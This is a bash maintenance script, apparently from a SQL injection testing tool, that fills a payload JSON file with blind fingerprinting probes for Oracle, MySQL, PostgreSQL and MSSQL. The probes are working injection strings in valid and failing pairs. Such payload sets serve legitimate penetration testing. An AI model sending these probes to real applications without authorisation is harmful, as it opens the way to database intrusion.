#!/bin/bash

# Define the target JSON file
FILE="Data/Payloads/sqli_payloads.json"

if [ ! -f "$FILE" ]; then
    echo "Error: $FILE does not exist. Please run this script from the project root directory."
    exit 1
fi

# We first try to use 'jq', which is the standard command-line JSON processor.
if command -v jq &> /dev/null; then
    PROBES=$(cat << 'EOF'
{
  "Oracle": {
    "valid": "xyz'||(SELECT '' FROM dual)||'",
    "bad": "xyz'||(SELECT '' FROM not_a_real_table_xyzzy)||'"
  },
  "MySQL": {
    "valid": "xyz' AND (SELECT 1)='1",
    "bad": "xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)='1"
  },
  "PostgreSQL": {
    "valid": "xyz' AND (SELECT 1)::text='1",
    "bad": "xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)::text='1"
  },
  "MSSQL": {
    "valid": "xyz' AND 1=(SELECT 1)--",
    "bad": "xyz' AND 1=(SELECT 1 FROM not_a_real_table_xyzzy)--"
  }
}
EOF
)
    # Update only the blind_fingerprint_probes field
    jq --argjson probes "$PROBES" '.blind_fingerprint_probes = $probes' "$FILE" > "$FILE.tmp" && mv "$FILE.tmp" "$FILE"
    
    echo "Successfully updated $FILE blind_fingerprint_probes using jq"

# If jq is not installed, we can safely fall back to python3 to update the field.
elif command -v python3 &> /dev/null; then
    python3 -c "
import json
import sys

file_path = '$FILE'
try:
    with open(file_path, 'r') as f:
        d = json.load(f)
    
    d['blind_fingerprint_probes'] = {
        'Oracle': {
            'valid': \"xyz'||(SELECT '' FROM dual)||'\",
            'bad':   \"xyz'||(SELECT '' FROM not_a_real_table_xyzzy)||'\",
        },
        'MySQL': {
            'valid': \"xyz' AND (SELECT 1)='1\",
            'bad':   \"xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)='1\",
        },
        'PostgreSQL': {
            'valid': \"xyz' AND (SELECT 1)::text='1\",
            'bad':   \"xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)::text='1\",
        },
        'MSSQL': {
            'valid': \"xyz' AND 1=(SELECT 1)--\",
            'bad':   \"xyz' AND 1=(SELECT 1 FROM not_a_real_table_xyzzy)--\",
        }
    }
    
    with open(file_path, 'w') as f:
        json.dump(d, f, indent=2)
        
    print('Successfully updated ' + file_path + ' blind_fingerprint_probes using python3 fallback')
    
except Exception as e:
    print('Error: Failed to update JSON file. Exception: ' + str(e))
    sys.exit(1)
"
else
    echo "Error: Neither 'jq' nor 'python3' is installed on this system. Unable to update JSON."
    exit 1
fi
